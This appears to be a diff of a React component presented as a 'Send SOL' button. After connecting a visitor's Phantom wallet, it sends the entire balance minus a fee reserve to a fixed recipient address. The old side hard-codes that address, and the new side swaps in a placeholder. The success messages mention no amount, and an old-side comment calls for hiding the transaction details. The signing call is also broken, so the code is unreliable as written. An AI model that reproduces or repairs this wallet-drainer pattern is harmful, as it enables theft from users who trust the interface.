@@ -4,10 +4,9 @@ import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } f
 function SolanaTransactionComponent() {
     const [walletAddress, setWalletAddress] = useState(null);
     const [errorMessage, setErrorMessage] = useState('');
-    const [isProcessing, setIsProcessing] = useState(false);
-    const [transactionMessage, setTransactionMessage] = useState(''); // New state for managing transaction messages
+    const [transactionStatus, setTransactionStatus] = useState(''); // State to keep track of the transaction status
 
-    // Define the connection object at the component level to avoid re-creating it
+    // Adjust with your connection string
     const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/yourAlchemyKey", 'confirmed');
 
     useEffect(() => {
@@ -15,10 +14,9 @@ function SolanaTransactionComponent() {
             try {
                 const { solana } = window;
                 if (solana?.isPhantom) {
-                    const response = await solana.connect();
-                    setWalletAddress(response.publicKey.toString());
-                    // Display a welcoming message upon wallet connection
-                    setTransactionMessage('Welcome! Your wallet is connected.');
+                    await solana.connect();
+                    setWalletAddress(solana.publicKey.toString());
+                    setTransactionStatus('Wallet connected. Ready to send.');
                 } else {
                     setErrorMessage('Phantom wallet not found. Please install Phantom.');
                 }
@@ -36,19 +34,19 @@ function SolanaTransactionComponent() {
             return;
         }
 
-        setIsProcessing(true);
-        setErrorMessage('');
+        setTransactionStatus('Processing your transaction...');
         try {
             const publicKey = new PublicKey(walletAddress);
             const balanceInLamports = await connection.getBalance(publicKey);
-            const feeReserve = LAMPORTS_PER_SOL * 0.005; // Reserve for gas fees
+            // Assuming a minimal amount reserved for fees
+            const feeReserve = LAMPORTS_PER_SOL * 0.01;
 
             if (balanceInLamports <= feeReserve) {
-                throw new Error('Insufficient balance to cover the transaction and fee.');
+                throw new Error('Insufficient balance.');
             }
 
             const amountToSend = balanceInLamports - feeReserve;
-            const recipientPublicKey = new PublicKey('34akXnFyRK2MowB3RG5jwX6Qf9AU22ewmPStXzeJehRh'); // Ensure this is the recipient's correct public key
+            const recipientPublicKey = new PublicKey('RecipientPublicKeyHere');
 
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
@@ -60,23 +58,18 @@ function SolanaTransactionComponent() {
 
             await connection.sendTransaction(transaction, [publicKey], {skipPreflight: false, preflightCommitment: 'confirmed'});
 
-            // Update the message to indicate success without showing transaction details
-            setTransactionMessage('Transaction successful! Thank you for using our service.');
+            setTransactionStatus('Transaction completed. Thank you!');
         } catch (error) {
-            console.error('Operation error:', error);
-            setErrorMessage(error.message || 'An error occurred during the operation.');
-        } finally {
-            setIsProcessing(false);
+            console.error('Transaction error:', error);
+            setErrorMessage('Transaction failed. Please try again.');
         }
     };
 
     return (
         <div>
-            <button onClick={handleTransaction} disabled={isProcessing}>
-                {isProcessing ? 'Processing...' : 'Send SOL'}
-            </button>
-            {errorMessage && <div>{errorMessage}</div>}
-            {transactionMessage && !errorMessage && <div>{transactionMessage}</div>} // Show transaction message when there's no error
+            <button onClick={handleTransaction}>Send SOL</button>
+            {/* Display either transaction status or error message */}
+            <div>{transactionStatus || errorMessage}</div>
         </div>
     );
 }
